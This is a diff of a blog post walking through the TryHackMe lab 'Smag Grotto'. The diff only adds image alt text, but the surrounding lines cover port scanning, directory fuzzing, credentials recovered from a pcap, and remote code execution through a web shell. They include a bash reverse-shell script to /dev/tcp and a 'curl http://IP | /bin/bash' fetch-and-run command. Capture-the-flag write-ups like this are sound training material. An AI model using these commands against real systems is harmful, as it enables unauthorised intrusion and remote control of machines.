@@ -12,7 +12,7 @@ In this post, we will work on the THM machine "Smag Grotto."
 
 First, we will determine whether we have a connection to the target machine.
 
-![](/images/ping.png)
+![Ping target machine](/images/ping.png)
 
 As we can see, we sent an ICMP trace and received it back; this means we have a connection to the machine.
 
@@ -22,7 +22,7 @@ We will begin scanning the ports using nmap to identify exposed services, with t
 sudo nmap -n --min-rate 5000 -p- -sS --open -Pn -vvv 10.66.128.160
 ```
 
-![](/images/scan.png)
+![Scanning with nmap](/images/scan.png)
 
 As we can see, only ports 22 and 80 are open.
 
@@ -35,11 +35,11 @@ As we can see, there is nothing of interest here, so let’s take a look at how 
 
 Upon entering, we observe the following:
 
-![](/images/scan_version.png)
+![Scanning version](/images/scan_version.png)
 
 Upon opening the page, we are greeted by the following: Welcome to Smag!
 
-![](/images/page_web.png)
+![Entering the page](/images/page_web.png)
 
 The first thing that came to mind was to do a:
 
@@ -47,7 +47,7 @@ Ctrl + U
 
 To inspect the page and see if there was anything in the comments that might provide a clue.
 
-![](/images/inspection_web.png)
+![Inspecting code](/images/inspection_web.png)
 
 Well, there wasn't anything interesting; even though there was a CSS file, I checked it, but there’s nothing there—it’s just for the page's decoration.
 
@@ -61,11 +61,11 @@ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_di
 
 Once the fuzzing was complete, we only discovered one directory: mail.
 
-![](/images/fuzzing.png)
+![Fuzzing on the web page](/images/fuzzing.png)
 
 We will access that directory via the URL.
 
-![](/images/directory_mail.png)
+![Email folder discovered](/images/directory_mail.png)
 
 It appears the employees have run into a network issue, and they have also provided us with a pcap file.
 
@@ -79,13 +79,13 @@ sudo wireshark dHJhY2Uy.pcap
 
 Upon opening the pcap, we can see all the requests that have been made.
 
-![](/images/wireshark.png)
+![Opening Wireshark to analyze a pcap capture](/images/wireshark.png)
 
 The ones we are interested in are the HTTP protocols.
 
 Since HTTP services do not encrypt the data sent to the server, it can be viewed in clear text.
 
-![](/images/data.png)
+![Subdomain found and credentials](/images/data.png)
 
 We can see that we have a subdomain, a username, and a password.
 
@@ -93,11 +93,11 @@ This means that Virtual Hosting is being applied.
 
 To be able to access this domain, we will need to include it in /etc/hosts.
 
-![](/images/hosting.png)
+![Adding the subdomain to /etc/hosts](/images/hosting.png)
 
 Let's see what this subdomain contains.
 
-![](/images/content_subdomain.png)
+![Analyzing subdomain content](/images/content_subdomain.png)
 
 Alright! As you can see, we have two resources that we couldn't access when using the IP address.
 
@@ -107,11 +107,11 @@ When attempting to access admin.php, we are redirected to login.php; so, let’s
 helpdesk : cH4nG3M3_n0w
 ```
 
-![](/images/login_area.png)
+![Login area](/images/login_area.png)
 
 Upon logging in, we discover what appears to be a type of webshell.
 
-![](/images/web_shell.png)
+![Web shell discovered](/images/web_shell.png)
 
 We tried running some basic commands, but it didn't show us the output.
 
@@ -123,21 +123,21 @@ To do this, we will first set our machine to listen for ICMP traces.
 sudo tcpdump -i tun0 -n icmp
 ```
 
-![](/images/listening_icmp.png)
+![ICMP trace listening](/images/listening_icmp.png)
 
 Now, from the web shell, we send ICMP traces to verify that we have RCE.
 
-![](/images/rce.png)
+![We have RCE](/images/rce.png)
 
 Upon returning to our terminal, we see that we do indeed have RCE!
 
-![](/images/validate_rce.png)
+![Validating RCE](/images/validate_rce.png)
 
 Now, we will gain access to the machine.
 
 Now we will create an `index.html`  , which in reality will not be HTML, but rather a bash script.
 
-![](/images/reverse_shell.png)
+![Creating a bash script to place in index.html](/images/reverse_shell.png)
 
 ```bash
 #!/usr/bin/bash
@@ -145,7 +145,7 @@ bash -i >& /dev/tcp/IP/PORT 0>&1
 ```
 Now we'll listen with nc
 
-![](/images/nc_listen.png)
+![Listen with netcat](/images/nc_listen.png)
 
 We will set up a server using Python 3 to share the index.html file.
 
@@ -155,7 +155,7 @@ We need to be in the same folder as index.html for this to work.
 sudo python3 -m http.server 80
 ```
 
-![](/images/server_path.png)
+![Set up a temporary server in Python 3](/images/server_path.png)
 
 We will do it this way to bypass any restrictions, in case the web shell has any.
 
@@ -165,13 +165,13 @@ Now, in the web shell, we will use the following command:
 curl http://IP | /bin/bash
 ```
 
-![](/images/gaining_access.png)
+![Sending a request to our server using curl](/images/gaining_access.png)
 
 This will cause `curl`  to send a web request to our server, retrieve the content of  `index.html`  (which is a Bash script), and then pipe it to  `/bin/bash`  for execution.
 
 We press Enter and...
 
-![](/images/shell_exec.png)
+![Gaining access to the victim machine](/images/shell_exec.png)
 
 Let’s go! We have access to the machine.
 
@@ -182,7 +182,7 @@ First, we will execute:
 ```bash
 script /dev/null bash
 ```
-![](/images/tty.png)
+![Treatment of the tty](/images/tty.png)
 
 Then CTRL + Z :
 
@@ -194,7 +194,7 @@ And in the terminal, we will type:
 stty raw -echo; fg
 ```
 
-![](/images/tty3.png)
+![Treatment of the tty](/images/tty3.png)
 
 And to wrap things up, we will write:
 
@@ -202,7 +202,7 @@ And to wrap things up, we will write:
 reset xterm
 ```
 
-![](/images/tty4.png)
+![Treatment of the tty](/images/tty4.png)
 
 And finally:
 
@@ -212,7 +212,7 @@ export TERM=xterm
 export SHELL=/bin/bash
 ```
 
-![](/images/tty_finally.png)
+![Treatment of the tty](/images/tty_finally.png)
 
 Now that we’ve started looking for the  `user.txt`  flag, I found a user named  `jake`  in the  `/home/`  directory.
 
